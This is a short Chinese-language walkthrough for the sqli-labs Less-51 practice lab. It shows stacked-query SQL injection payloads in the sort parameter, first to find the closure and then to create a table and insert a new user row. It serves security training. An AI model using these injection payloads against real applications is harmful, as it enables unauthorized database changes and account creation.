---
title: Less - 51
date: 2023-03-22T13:26:28Z
lastmod: 2023-03-22T13:32:22Z
---

# Less - 51

---

# 通关教程

---

## 1、判断闭合

---

```http
?sort=1'
```

​![image](assets/image-20230322132851-w8vyfcg.png)​

根据错误显示判断闭合方式为'--+，并且为字符型注入

---

## 2、新建一张表

---

```http
http://192.168.23.128/sqli-labs/Less-51/?sort=1';create table test like users;--+
```

​![image](assets/image-20230322133054-6j9gu3i.png)​

---

## 3、新建一个用户

---

```http
http://192.168.23.128/sqli-labs/Less-51/?sort=1';insert into users values(18,'cmx','cmx')--+
```

​![image](assets/image-20230322133154-9jvmdfe.png)​

​![image](assets/image-20230322133220-uk870sp.png)​

‍
